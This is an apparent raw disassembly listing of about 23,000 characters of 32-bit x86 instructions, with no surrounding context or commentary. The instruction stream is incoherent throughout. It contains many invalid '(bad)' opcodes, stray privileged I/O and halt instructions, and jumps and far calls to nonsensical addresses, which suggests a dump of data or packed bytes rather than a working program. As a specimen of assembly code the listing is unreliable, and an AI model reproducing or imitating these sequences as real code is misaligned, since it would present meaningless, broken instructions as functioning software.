  414a5d:	lea    edi,[eax-0x7ccfcfe4]
  414a63:	xchg   ecx,eax
  414a64:	pop    ecx
  414a65:	clc    
  414a66:	lods   al,BYTE PTR ds:[esi]
  414a67:	xor    cl,BYTE PTR ss:[ebx-0x221cd559]
  414a6e:	and    BYTE PTR [ebx-0xd],dh
  414a71:	neg    ecx
  414a73:	inc    esp
  414a74:	popf   
  414a75:	cld    
  414a76:	push   ds
  414a77:	ds dec ebx
  414a79:	je     0x414a3f
  414a7b:	jmp    0x414aeb
  414a7d:	mov    dh,0x76
  414a7f:	push   ecx
  414a80:	fst    st(6)
  414a82:	cld    
  414a83:	daa    
  414a84:	daa    
  414a85:	mov    cl,0x2e
  414a87:	sahf   
  414a88:	xor    eax,0xb3a65449
  414a8d:	xchg   dl,ch
  414a8f:	dec    edx
  414a90:	add    al,0x36
  414a92:	inc    esp
  414a93:	pop    ebp
  414a94:	lds    esi,FWORD PTR [edi+0x3a]
  414a97:	xor    bh,BYTE PTR [ecx]
  414a99:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a9b:	push   eax
  414a9c:	and    esp,DWORD PTR [ecx+ebx*2+0x7b06dec8]
  414aa3:	mov    ch,0x3c
  414aa5:	push   esp
  414aa6:	fiadd  WORD PTR [edi]
  414aa8:	test   BYTE PTR [ebp-0x1b33e9a3],bl
  414aae:	mov    ah,0xe0
  414ab0:	enclv  
  414ab3:	xlat   BYTE PTR ds:[ebx]
  414ab4:	mov    eax,0xbc48cd27
  414ab9:	sbb    dh,BYTE PTR [ecx-0x2752f4fa]
  414abf:	push   ebx
  414ac0:	test   DWORD PTR [esi],ecx
  414ac2:	inc    ecx
  414ac3:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414ac5:	cs inc ecx
  414ac7:	mov    edi,0x5ee42002
  414acc:	mov    bl,0xf5
  414ace:	or     DWORD PTR [edi+0x69ed7fff],edx
  414ad4:	jo     0x414aae
  414ad6:	mov    bh,0x46
  414ad8:	mov    al,BYTE PTR [edx+eax*1]
  414adb:	jg     0x414b26
  414add:	adc    bl,ch
  414adf:	inc    edi
  414ae0:	and    edx,DWORD PTR [ebp+ebp*4+0x5dd2b5af]
  414ae7:	repz fdivr DWORD PTR [ebp+0x77c7fb06]
  414aee:	cli    
  414aef:	lods   eax,DWORD PTR ds:[esi]
  414af0:	sbb    ebx,ebx
  414af2:	jns    0x414aaf
  414af4:	pop    ecx
  414af5:	jo     0x414af7
  414af7:	dec    ebp
  414af8:	jns    0x414b3f
  414afa:	mov    dh,0xe3
  414afc:	dec    ecx
  414afd:	sbb    bh,bl
  414aff:	lock (bad) 
  414b01:	call   0x52d9:0x72bc4988
  414b08:	ret    0xa6d8
  414b0b:	ret    
  414b0c:	frstor ds:0x201a78
  414b12:	inc    edi
  414b13:	and    al,0x6c
  414b15:	pop    esi
  414b16:	pop    ds
  414b17:	or     bh,BYTE PTR ds:0xb9087dc6
  414b1d:	dec    esp
  414b1e:	push   ss
  414b1f:	fwait
  414b20:	jbe    0x414b38
  414b22:	cmp    DWORD PTR ds:[edi+0x6b134500],ebp
  414b29:	sbb    BYTE PTR [ecx+esi*4+0x2018938d],dh
  414b30:	jae    0x414ad4
  414b32:	mov    bl,0xc8
  414b34:	enter  0xd553,0x3c
  414b38:	push   0xffffffe9
  414b3a:	jle    0x414b36
  414b3c:	add    esi,DWORD PTR [esi+0x3e]
  414b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b40:	in     al,0x30
  414b42:	and    al,0xe5
  414b44:	push   esi
  414b45:	inc    ebp
  414b46:	cld    
  414b47:	xchg   esp,eax
  414b48:	jb     0x414b8b
  414b4a:	cmp    al,bh
  414b4c:	retf   0x1be8
  414b4f:	xlat   BYTE PTR ds:[ebx]
  414b50:	push   ss
  414b51:	mov    ch,0xc2
  414b53:	mov    BYTE PTR [ebp+edi*2+0x63dd1b80],bh
  414b5a:	sahf   
  414b5b:	mov    eax,ds:0x869ea587
  414b60:	xor    ebx,eax
  414b62:	cmp    al,0x94
  414b64:	loop   0x414b48
  414b66:	pop    es
  414b67:	stos   DWORD PTR es:[edi],eax
  414b68:	(bad)  
  414b69:	sbb    eax,DWORD PTR [esi-0x1ec8d8e7]
  414b6f:	jae    0x414ba2
  414b71:	jmp    0x2b737a57
  414b76:	dec    eax
  414b77:	mov    edx,0x995f2ce
  414b7c:	xchg   edi,eax
  414b7d:	out    0x2d,al
  414b7f:	or     eax,0xbe3b6218
  414b84:	sahf   
  414b85:	sbb    ebp,DWORD PTR [esp+ebp*1-0x1bc1602e]
  414b8c:	mov    edi,0x777168f9
  414b91:	or     DWORD PTR ds:0x8243a53f,edi
  414b97:	popa   
  414b98:	pop    esi
  414b99:	xchg   ebp,eax
  414b9a:	out    0x7d,eax
  414b9c:	inc    edi
  414b9d:	lahf   
  414b9e:	je     0x414b79
  414ba0:	cdq    
  414ba1:	add    eax,0xf550f1da
  414ba6:	int3   
  414ba7:	xlat   BYTE PTR ds:[ebx]
  414ba8:	lock aad 0xa2
  414bab:	data16 sub al,0x7c
  414bae:	ss (bad) 
  414bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bb1:	loopne 0x414ba7
  414bb3:	idiv   DWORD PTR [ebx+edx*1]
  414bb6:	ins    BYTE PTR es:[edi],dx
  414bb7:	das    
  414bb8:	jae    0x414c2c
  414bba:	pusha  
  414bbb:	and    ebp,ecx
  414bbd:	shl    BYTE PTR [ecx+0x1e1b165e],1
  414bc3:	push   0xffffffab
  414bc5:	out    0xaa,eax
  414bc7:	fstp   QWORD PTR [edx-0x20]
  414bca:	mov    ds:0x7c1ec5c6,eax
  414bcf:	xlat   BYTE PTR ds:[ebx]
  414bd0:	xchg   ecx,eax
  414bd1:	mov    bl,cl
  414bd3:	mov    eax,ds:0x8a605e64
  414bd8:	stos   BYTE PTR es:[edi],al
  414bd9:	or     al,0x15
  414bdb:	js     0x414c3b
  414bdd:	(bad)  
  414bde:	repz jo 0x414c42
  414be1:	mov    cl,0xf1
  414be3:	mov    ebx,0x222b480c
  414be8:	sub    BYTE PTR [esi-0x7b],bl
  414beb:	dec    ebx
  414bec:	addr16 mov edi,0xdf3592c7
  414bf2:	dec    eax
  414bf3:	dec    esp
  414bf4:	int3   
  414bf5:	mov    edx,0xc5dfb5be
  414bfa:	push   ecx
  414bfb:	repz sub DWORD PTR [esi-0x5b],0xfffffffe
  414c00:	add    ebx,esi
  414c02:	pop    edx
  414c03:	adc    al,0xb6
  414c05:	or     edi,DWORD PTR [edx+esi*8-0xdc262ab]
  414c0c:	push   ebp
  414c0d:	js     0x414c6e
  414c0f:	mov    ecx,0x3d6c22ea
  414c14:	dec    edi
  414c15:	(bad)  
  414c16:	push   ss
  414c17:	imul   ebp,ecx,0x838acf61
  414c1d:	mov    ebp,0xb19cf169
  414c22:	xor    cl,ch
  414c24:	sub    esp,DWORD PTR [ebp+0x4e529da4]
  414c2a:	test   DWORD PTR [edx-0x61],0x8e0c9b3b
  414c31:	mov    ds:0x11334450,al
  414c36:	jmp    0x8add:0xb813901d
  414c3d:	fbld   TBYTE PTR [esi-0x4c]
  414c40:	mov    al,0x88
  414c42:	outs   dx,BYTE PTR ds:[esi]
  414c43:	sub    bh,BYTE PTR [ecx-0x54ec3086]
  414c49:	sub    DWORD PTR [edi],edx
  414c4b:	xor    cl,BYTE PTR [esi-0x2e]
  414c4e:	push   ss
  414c4f:	into   
  414c50:	xor    cl,0x23
  414c53:	xor    dl,BYTE PTR [ecx]
  414c55:	xor    edi,ecx
  414c57:	mov    ch,0x24
  414c59:	xchg   esp,eax
  414c5a:	loopne 0x414bee
  414c5c:	jbe    0x414c13
  414c5e:	xchg   edx,eax
  414c5f:	dec    ebp
  414c60:	mov    al,0x83
  414c62:	dec    ebx
  414c63:	retf   
  414c64:	add    al,BYTE PTR [eax+0x22a024f3]
  414c6a:	sar    dh,0x7f
  414c6d:	iret   
  414c6e:	ret    0x9430
  414c71:	rcr    DWORD PTR [esi],cl
  414c73:	mov    dl,0x25
  414c75:	ret    0xf6c6
  414c78:	adc    DWORD PTR [ecx-0x3f],ecx
  414c7b:	call   DWORD PTR [edx]
  414c7d:	push   esp
  414c7e:	(bad)  
  414c7f:	mov    al,ds:0xa43ba9e3
  414c84:	mov    ch,0x31
  414c86:	dec    edi
  414c87:	sbb    al,0xc4
  414c89:	ror    dh,0x33
  414c8c:	imul   esp,DWORD PTR [esi],0x48
  414c8f:	inc    esi
  414c90:	jae    0x414c62
  414c92:	in     eax,dx
  414c93:	stos   DWORD PTR es:[edi],eax
  414c94:	push   cs
  414c95:	cwde   
  414c96:	inc    esi
  414c97:	cs addr16 xchg ecx,eax
  414c9a:	popf   
  414c9b:	es inc ecx
  414c9d:	adc    ah,al
  414c9f:	in     al,dx
  414ca0:	adc    eax,0xd86430d4
  414ca5:	jns    0x414c8d
  414ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ca8:	xchg   DWORD PTR [ebx-0x56d88082],edx
  414cae:	xchg   esp,eax
  414caf:	add    edx,DWORD PTR [ebx-0x1c]
  414cb2:	cmp    al,0x96
  414cb4:	push   ds
  414cb5:	dec    ebp
  414cb6:	jp     0x414c46
  414cb8:	nop
  414cb9:	push   edi
  414cba:	pop    esp
  414cbb:	fild   WORD PTR [edi]
  414cbd:	xor    ecx,edi
  414cbf:	sbb    ah,BYTE PTR [edx-0x4b]
  414cc2:	out    0xe5,eax
  414cc4:	mov    esi,0x63bbe54e
  414cc9:	or     al,BYTE PTR [ecx+0x39]
  414ccc:	leave  
  414ccd:	in     eax,dx
  414cce:	mov    esp,0xf0a347c8
  414cd3:	bound  ecx,QWORD PTR [ebx]
  414cd5:	scas   al,BYTE PTR es:[edi]
  414cd6:	sti    
  414cd7:	and    bh,BYTE PTR [ecx]
  414cd9:	mov    al,ds:0x2235abcf
  414cde:	and    ebx,ebx
  414ce0:	jp     0x414d4f
  414ce2:	jge    0x414d50
  414ce4:	jp     0x414cef
  414ce6:	jnp    0x414d06
  414ce8:	mov    ebx,DWORD PTR [edi+0x5f0f3312]
  414cee:	shl    BYTE PTR [eax-0x768ee261],1
  414cf4:	and    eax,0x6e731d50
  414cf9:	bound  esi,QWORD PTR [ebp+0x2b1ad334]
  414cff:	(bad)  
  414d00:	push   edx
  414d02:	sub    eax,DWORD PTR [ebp-0x56cc6a86]
  414d08:	xor    eax,0x31e3e04d
  414d0d:	rcl    eax,1
  414d0f:	int3   
  414d10:	add    BYTE PTR [eax],bh
  414d12:	ss adc edx,ecx
  414d15:	(bad)  
  414d16:	cmp    bh,BYTE PTR [di]
  414d19:	dec    edi
  414d1a:	fadd   st,st(6)
  414d1c:	sar    DWORD PTR [ebp-0x28],0x5a
  414d20:	jae    0x414d64
  414d22:	cmp    al,0xc2
  414d24:	jo     0x414d60
  414d26:	pop    edx
  414d27:	sahf   
  414d28:	inc    edi
  414d29:	hlt    
  414d2a:	in     eax,dx
  414d2b:	lods   al,BYTE PTR ds:[esi]
  414d2c:	(bad)  
  414d2e:	dec    ebx
  414d2f:	popa   
  414d30:	pusha  
  414d31:	aam    0x80
  414d33:	out    dx,eax
  414d34:	jns    0x414d75
  414d36:	dec    ecx
  414d37:	test   ax,0xf47
  414d3b:	scas   al,BYTE PTR es:[edi]
  414d3c:	out    dx,eax
  414d3d:	jbe    0x414d5d
  414d3f:	(bad)  
  414d41:	or     al,0x7a
  414d43:	pop    esp
  414d44:	test   DWORD PTR [esp+ebx*8],ecx
  414d47:	dec    ebp
  414d48:	adc    edi,DWORD PTR [esi]
  414d4a:	out    dx,eax
  414d4b:	nop
  414d4c:	pop    ebx
  414d4d:	stos   DWORD PTR es:[edi],eax
  414d4e:	popa   
  414d4f:	adc    DWORD PTR [eax],ebx
  414d51:	mov    esi,0xc444aa69
  414d56:	sbb    eax,0x2ec86def
  414d5b:	or     bh,0x1e
  414d5e:	test   al,0x89
  414d60:	bound  ebx,QWORD PTR [edx+0x68]
  414d63:	and    al,BYTE PTR [eax-0x77]
  414d66:	out    0x3d,al
  414d68:	xor    al,0xd6
  414d6a:	or     DWORD PTR [edx-0x15],ebp
  414d6d:	push   esi
  414d6e:	jle    0x414cfd
  414d70:	add    eax,0x6372db27
  414d75:	sub    BYTE PTR ds:0x590d6998,0x8d
  414d7c:	xor    DWORD PTR [eax],esp
  414d7e:	repz push edx
  414d80:	ret    0x93fb
  414d83:	fwait
  414d84:	cs int 0x43
  414d87:	imul   edx,DWORD PTR [ebp-0x4b9e9c4d],0x76
  414d8e:	enter  0x21fc,0x97
  414d92:	stc    
  414d93:	adc    al,0xc0
  414d95:	xor    DWORD PTR [ebx-0x69],ebp
  414d98:	push   esp
  414d99:	arpl   bx,sp
  414d9b:	xor    eax,0xd317b5ab
  414da0:	into   
  414da1:	mov    eax,ds:0x4e2f3b12
  414da6:	jne    0x414dc9
  414da8:	nop
  414da9:	jne    0x414dcc
  414dab:	jno    0x414d2e
  414dad:	mov    WORD PTR [ecx-0x4d9edf9e],?
  414db3:	add    bl,BYTE PTR [ebp-0x68e1e12f]
  414db9:	xchg   edx,eax
  414dba:	add    al,0x99
  414dbc:	sub    DWORD PTR [edi+0x1941fdc8],edx
  414dc2:	lds    ecx,FWORD PTR [esi-0x24b046a4]
  414dc8:	pop    ebx
  414dc9:	fs test al,0x13
  414dcc:	loop   0x414db8
  414dce:	inc    esi
  414dcf:	imul   edx,DWORD PTR [edi],0xcb250e8a
  414dd5:	mov    al,ds:0xc7e10471
  414dda:	in     eax,dx
  414ddb:	jp     0x414e4f
  414ddd:	enter  0x1c73,0x16
  414de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de2:	adc    ecx,ecx
  414de4:	js     0x414dd4
  414de6:	or     BYTE PTR [esi-0x11],dl
  414de9:	outs   dx,BYTE PTR ds:[esi]
  414dea:	jmp    0x80179981
  414def:	adc    esi,edi
  414df1:	mov    eax,ds:0x3eaac08a
  414df6:	sbb    al,0x32
  414df8:	scas   al,BYTE PTR es:[edi]
  414df9:	mov    al,ds:0x26195e68
  414dfe:	(bad)  
  414dff:	pop    esi
  414e00:	adc    BYTE PTR [edi+ebx*8-0x10],dh
  414e04:	sahf   
  414e05:	sub    al,0xbd
  414e07:	mov    ss,esi
  414e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e0a:	adc    dl,BYTE PTR [ebx+0x3d]
  414e0d:	into   
  414e0e:	pop    sp
  414e10:	adc    DWORD PTR [eax],0x7e
  414e13:	add    ecx,esp
  414e15:	mov    eax,0xd85a129f
  414e1a:	jns    0x414e90
  414e1c:	mov    ds:0x8515e2bd,al
  414e21:	test   BYTE PTR [ebp+eax*1-0x4eb49a68],ch
  414e28:	jg     0x414e11
  414e2a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e2c:	aaa    
  414e2d:	stc    
  414e2e:	inc    ebx
  414e2f:	add    DWORD PTR [eax+0xf663319],esi
  414e35:	adc    eax,0xb943b4d9
  414e3a:	inc    edi
  414e3b:	fnstenv [edi-0x25ea88ca]
  414e41:	add    esp,esp
  414e43:	jne    0x414df6
  414e45:	fwait
  414e46:	sqrtps xmm4,XMMWORD PTR [esi+0x49dca6be]
  414e4d:	call   0x2bf1:0x5b7f202a
  414e54:	push   ss
  414e55:	cmp    eax,0xb70171ec
  414e5a:	cmp    BYTE PTR [ebp+0x76157664],ch
  414e60:	mov    cs,ecx
  414e62:	rcl    dh,cl
  414e64:	push   ecx
  414e65:	or     BYTE PTR [ebx+ebx*4],cl
  414e68:	mov    al,0xdd
  414e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e6b:	call   0xbb78:0x66f6e75d
  414e72:	hlt    
  414e73:	lods   al,BYTE PTR ds:[esi]
  414e74:	and    ecx,DWORD PTR [edx]
  414e76:	jo     0x414e01
  414e78:	mov    ds:0x36e8bb2b,eax
  414e7d:	xchg   bx,ax
  414e7f:	retf   0xbab8
  414e82:	dec    ebx
  414e83:	mov    dh,BYTE PTR [edx-0x49]
  414e86:	mov    eax,ds:0x555ed708
  414e8b:	mov    al,dl
  414e8d:	add    esp,edx
  414e8f:	push   eax
  414e90:	into   
  414e91:	push   ebp
  414e92:	push   ebp
  414e93:	test   DWORD PTR [esi+0x1f],ecx
  414e96:	pop    ebx
  414e97:	or     DWORD PTR [edx],0xffffffed
  414e9a:	jbe    0x414ea7
  414e9c:	ins    DWORD PTR es:[edi],dx
  414e9d:	mov    al,ds:0xe3a3225e
  414ea2:	lods   al,BYTE PTR ds:[esi]
  414ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ea4:	lods   eax,DWORD PTR ds:[esi]
  414ea5:	leave  
  414ea6:	inc    esp
  414ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ea8:	repz imul esp,ecx,0x84a59793
  414eaf:	fdiv   DWORD PTR [ebx-0x15286072]
  414eb5:	aas    
  414eb6:	jg     0x414f09
  414eb8:	ja     0x414f03
  414eba:	dec    ebp
  414ebb:	fisubr WORD PTR [edi+0x72611e78]
  414ec1:	jne    0x414e58
  414ec3:	mov    dl,0x2
  414ec5:	fst    DWORD PTR [edx-0x24]
  414ec8:	fild   DWORD PTR [eax]
  414eca:	mov    dh,0x1
  414ecc:	stc    
  414ecd:	mov    ds:0xcb78d9a8,al
  414ed2:	in     al,0xba
  414ed4:	aad    0x6f
  414ed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ed7:	(bad)  
  414ed8:	mov    DWORD PTR [ebx],esp
  414eda:	in     eax,dx
  414edb:	push   esp
  414edc:	push   es
  414edd:	and    BYTE PTR fs:[ecx],0x9e
  414ee1:	scas   eax,DWORD PTR es:[edi]
  414ee2:	push   esi
  414ee3:	and    eax,0xc66e76e5
  414ee8:	push   eax
  414ee9:	pop    edi
  414eea:	retf   0x1f56
  414eed:	(bad)  
  414eee:	xor    dh,dh
  414ef0:	sub    BYTE PTR [eax-0x7d],bl
  414ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ef4:	shl    DWORD PTR [edi+0x5921bf03],cl
  414efa:	ss mov cl,0x90
  414efd:	shl    al,cl
  414eff:	sub    esp,DWORD PTR [ecx]
  414f01:	aaa    
  414f02:	sti    
  414f03:	dec    edi
  414f04:	jo     0x414f42
  414f06:	(bad)  
  414f08:	rol    DWORD PTR [ebp-0x55f2e807],cl
  414f0e:	mov    dh,0x52
  414f10:	(bad)  
  414f11:	xor    cl,dh
  414f13:	or     eax,0x10e131d2
  414f18:	dec    esi
  414f19:	push   edx
  414f1a:	mov    esp,0xace561a3
  414f1f:	in     eax,dx
  414f20:	mov    ah,0xfb
  414f22:	into   
  414f23:	out    0x34,eax
  414f25:	dec    ecx
  414f26:	sbb    DWORD PTR [ebx-0x5c],ebx
  414f29:	inc    esp
  414f2a:	(bad)  
  414f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f2c:	push   eax
  414f2d:	mov    esp,edx
  414f2f:	mov    ecx,0xeefef95b
  414f34:	enter  0xffa6,0x73
  414f38:	div    DWORD PTR [eax-0x25a10dfd]
  414f3e:	push   es
  414f3f:	lods   al,BYTE PTR ds:[esi]
  414f40:	dec    edi
  414f41:	rol    DWORD PTR [eax+ebx*4+0x5d],1
  414f45:	push   cs
  414f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f47:	or     ah,BYTE PTR [edx]
  414f49:	adc    eax,0x18b370d2
  414f4e:	lock or BYTE PTR [ebx-0x41],bl
  414f52:	push   edi
  414f53:	in     eax,dx
  414f54:	test   al,0xec
  414f56:	loop   0x414f4b
  414f58:	aam    0x20
  414f5a:	cli    
  414f5b:	aaa    
  414f5c:	adc    dl,ch
  414f5e:	pop    esi
  414f5f:	test   al,0x42
  414f61:	or     al,0x4b
  414f63:	ins    DWORD PTR es:[edi],dx
  414f64:	add    ch,dh
  414f66:	aaa    
  414f67:	(bad)  
  414f68:	push   edi
  414f69:	je     0x414f55
  414f6b:	or     DWORD PTR [edi],esi
  414f6d:	sbb    ah,al
  414f6f:	pop    ecx
  414f70:	pop    ss
  414f71:	std    
  414f72:	inc    ecx
  414f73:	iret   
  414f74:	push   esi
  414f75:	inc    esi
  414f76:	mov    edx,0xb0b75779
  414f7b:	cmp    DWORD PTR ds:0xbebc90e8,ebx
  414f81:	ins    DWORD PTR es:[edi],dx
  414f82:	scas   eax,DWORD PTR es:[edi]
  414f83:	sub    ebp,edx
  414f85:	int3   
  414f86:	lods   al,BYTE PTR ds:[esi]
  414f87:	ds pop ds
  414f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f8a:	test   eax,0xb02b2732
  414f8f:	repz sub dl,BYTE PTR [eiz*2+0x21ddc299]
  414f97:	mov    ah,0xba
  414f99:	xchg   ebp,eax
  414f9a:	loope  0x414f71
  414f9c:	and    cl,ch
  414f9e:	push   ebx
  414f9f:	mov    esp,0xd8d41393
  414fa4:	mov    ah,0x5f
  414fa6:	test   eax,0xe20d7c05
  414fab:	sub    edx,DWORD PTR [eax+edi*8]
  414fae:	fsub   st,st(2)
  414fb0:	in     eax,0x92
  414fb2:	mov    ecx,gs
  414fb4:	xchg   esi,eax
  414fb5:	mov    bl,0x99
  414fb7:	dec    edx
  414fb8:	dec    edx
  414fb9:	lea    esi,[ebx+0x2fbd8c60]
  414fbf:	pop    es
  414fc0:	dec    edi
  414fc1:	scas   al,BYTE PTR es:[edi]
  414fc2:	mov    DWORD PTR ds:0xd63d5ba0,eax
  414fc8:	hlt    
  414fc9:	arpl   WORD PTR [eax],cx
  414fcb:	retf   
  414fcc:	add    BYTE PTR [esi-0x23b3cdb8],ch
  414fd2:	out    0xb2,al
  414fd4:	jl     0x414f92
  414fd6:	in     al,dx
  414fd7:	push   es
  414fd8:	jo     0x414fcc
  414fda:	pusha  
  414fdb:	cld    
  414fdc:	adc    edx,edx
  414fde:	iret   
  414fdf:	call   0x9c0b4a01
  414fe4:	aad    0xfa
  414fe6:	imul   esi,DWORD PTR [ebx+0x7f],0x37344b5e
  414fed:	sub    al,0x12
  414fef:	sbb    ebp,edi
  414ff1:	sub    eax,0x8bf5e97f
  414ff6:	fwait
  414ff7:	or     bh,ah
  414ff9:	jp     0x415035
  414ffb:	mov    dh,0xa1
  414ffd:	and    BYTE PTR [eax+0x5],bl
  415000:	adc    ecx,eax
  415002:	imul   eax,DWORD PTR [ebx],0xfcae56b5
  415008:	inc    esp
  415009:	dec    esp
  41500a:	retf   
  41500b:	sbb    eax,0xf76a3ed4
  415010:	xor    BYTE PTR [edx],dh
  415012:	sub    bh,cl
  415014:	sahf   
  415015:	mov    al,ds:0x2a621223
  41501a:	add    ch,BYTE PTR [ecx-0x4995cec4]
  415020:	lahf   
  415021:	dec    esp
  415022:	add    ebx,DWORD PTR [eax-0x7f756c1b]
  415028:	inc    eax
  415029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41502a:	cmp    dl,ah
  41502c:	or     esp,ebp
  41502e:	cmp    ah,dl
  415030:	xor    dl,ch
  415032:	into   
  415033:	shl    cl,0x84
  415036:	out    0x7,eax
  415038:	dec    ebx
  415039:	(bad)  
  41503b:	std    
  41503c:	iret   
  41503d:	sbb    dl,BYTE PTR [esi]
  41503f:	jmp    0x415097
  415041:	ss cld 
  415043:	retf   0x674
  415046:	lahf   
  415047:	or     edx,DWORD PTR [eax+ebx*4-0x783c3600]
  41504e:	push   esp
  41504f:	dec    edi
  415050:	fcmovu st,st(6)
  415052:	add    al,0x8f
  415054:	arpl   cx,si
  415056:	clc    
  415057:	mov    DWORD PTR [esi],edx
  415059:	ror    BYTE PTR [eax+0x6b7807ef],0xac
  415060:	ds test eax,0xb06472c8
  415066:	sbb    BYTE PTR [eax],ch
  415068:	add    ah,ah
  41506a:	jmp    0x3368:0x951a7716
  415071:	clc    
  415072:	or     BYTE PTR [ebp+0x7f49451a],dl
  415078:	fwait
  415079:	inc    eax
  41507a:	mov    eax,0x16f94266
  41507f:	mov    eax,ds:0x240753d2
  415084:	add    eax,0x165772ee
  415089:	xchg   BYTE PTR [edx-0x414a0181],ah
  41508f:	loop   0x415015
  415091:	pusha  
  415092:	or     al,0x68
  415094:	in     al,dx
  415095:	add    edx,0xbb653748
  41509b:	mov    ebx,0x4adeaef9
  4150a0:	lahf   
  4150a1:	fmul   st(5),st
  4150a3:	aaa    
  4150a4:	cwde   
  4150a5:	mov    ecx,0xc802b2a1
  4150aa:	jne    0x41505e
  4150ac:	xchg   ebx,eax
  4150ad:	(bad)  
  4150ae:	rcl    BYTE PTR [edi+0x14],1
  4150b1:	inc    DWORD PTR [edx]
  4150b3:	adc    bh,dl
  4150b5:	pop    ebp
  4150b6:	ja     0x415096
  4150b8:	inc    eax
  4150b9:	retf   
  4150ba:	test   al,0x50
  4150bc:	(bad)  
  4150bd:	or     DWORD PTR ds:0x11247b0c,ebp
  4150c3:	push   ss
  4150c4:	pushf  
  4150c5:	sub    eax,DWORD PTR [ecx+0xd]
  4150c8:	pop    es
  4150c9:	mul    DWORD PTR [eax-0x1e302804]
  4150cf:	fisttp WORD PTR [edx+0x0]
  4150d2:	pop    es
  4150d3:	sub    BYTE PTR [edi],bh
  4150d5:	xchg   DWORD PTR [esi+0x32ae964c],eax
  4150db:	xor    dl,bh
  4150dd:	repz sub BYTE PTR [ebx+0x653eddaa],bl
  4150e4:	ror    DWORD PTR [ebx-0x648b08a7],1
  4150ea:	or     dl,BYTE PTR [eax]
  4150ec:	push   cs
  4150ed:	nop
  4150ee:	or     BYTE PTR [eax+ebx*1+0x7b1d4d87],dh
  4150f5:	add    DWORD PTR [ebx],0x58
  4150f8:	leave  
  4150f9:	stc    
  4150fa:	cwde   
  4150fb:	stc    
  4150fc:	mov    ebp,ds
  4150fe:	push   ds
  4150ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415100:	out    0xe3,eax
  415102:	push   edx
  415103:	mov    cl,0x42
  415105:	int    0x9a
  415107:	movd   mm7,DWORD PTR [ecx-0x24bd39d4]
  41510e:	sub    dh,BYTE PTR [edi-0x109d8e4b]
  415114:	pop    edx
  415115:	mov    ch,0xd
  415117:	or     DWORD PTR [eax],esp
  415119:	test   DWORD PTR [ecx+0x3c656bc],ebx
  41511f:	jns    0x41516b
  415121:	jne    0x415170
  415123:	int3   
  415124:	out    dx,al
  415125:	fs aas 
  415127:	push   es
  415128:	xor    al,0x53
  41512a:	les    eax,FWORD PTR [ebp-0xc]
  41512d:	pop    ss
  41512e:	frstor [ebx+0x7]
  415131:	fld    QWORD PTR [edx+0x63bf9066]
  415137:	fistp  WORD PTR [esi-0x5a]
  41513a:	dec    ebp
  41513b:	int3   
  41513c:	mov    DWORD PTR [edx+0x61f84fff],ebx
  415142:	test   al,0xfc
  415144:	add    cl,BYTE PTR [ebx]
  415146:	scas   al,BYTE PTR es:[edi]
  415147:	stos   DWORD PTR es:[edi],eax
  415148:	jmp    0x6e4cbb4e
  41514d:	jge    0x41513d
  41514f:	div    BYTE PTR [ecx-0x33]
  415152:	pop    es
  415153:	shl    BYTE PTR [edi],1
  415155:	sti    
  415156:	pop    ebx
  415157:	aas    
  415158:	aam    0xa0
  41515a:	mov    al,0x78
  41515c:	jns    0x41518a
  41515e:	mov    esi,0x7cfe74c4
  415163:	xor    al,0x74
  415165:	call   0xb7046189
  41516a:	pop    ds
  41516b:	aas    
  41516c:	ror    DWORD PTR [esi+0x60],1
  41516f:	push   0xffffff9f
  415171:	mov    edx,0x905688ad
  415176:	out    dx,eax
  415177:	out    0x3,eax
  415179:	xchg   edx,eax
  41517a:	adc    esi,DWORD PTR [ecx-0x334755b9]
  415180:	test   al,0x74
  415182:	push   edx
  415183:	or     BYTE PTR [edi+0x7a],ch
  415186:	inc    ebx
  415187:	(bad)  
  415189:	mov    ebx,DWORD PTR [esi]
  41518b:	cmc    
  41518c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518d:	scas   eax,DWORD PTR es:[edi]
  41518e:	fwait
  41518f:	out    0x2f,eax
  415191:	stos   BYTE PTR es:[edi],al
  415192:	in     al,0x9a
  415194:	cmp    eax,0xdcda283
  415199:	xlat   BYTE PTR ds:[ebx]
  41519a:	xchg   edi,eax
  41519b:	mov    ds:0xfa4ff448,al
  4151a0:	pop    ss
  4151a1:	jnp    0x415162
  4151a3:	hlt    
  4151a4:	add    al,0x4f
  4151a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a7:	clc    
  4151a8:	fld    TBYTE PTR [ebx]
  4151aa:	jmp    0x9307a16f
  4151af:	(bad)  
  4151b0:	(bad)  
  4151b1:	pop    esp
  4151b2:	inc    DWORD PTR [ebx]
  4151b4:	nop
  4151b5:	ror    BYTE PTR [ebp+0x5],0xb8
  4151b9:	dec    esp
  4151ba:	(bad)  
  4151bb:	ds sub al,0xeb
  4151be:	mov    esi,0xd74b8cb4
  4151c3:	push   es
  4151c4:	mov    al,ds:0x12c89f0f
  4151c9:	adc    ecx,DWORD PTR ds:0x622a50b3
  4151cf:	dec    edx
  4151d0:	fwait
  4151d1:	out    dx,eax
  4151d2:	les    ecx,FWORD PTR [edx-0x344369b6]
  4151d8:	ja     0x41524f
  4151da:	add    ebx,DWORD PTR [edx]
  4151dc:	push   ebp
  4151dd:	out    0xbd,al
  4151df:	pop    edx
  4151e0:	cmp    al,0x71
  4151e2:	mov    BYTE PTR [edx+eiz*8],ch
  4151e5:	fmul   QWORD PTR [ecx]
  4151e7:	pop    ss
  4151e8:	mov    ebp,DWORD PTR [edi+0x70]
  4151eb:	out    dx,al
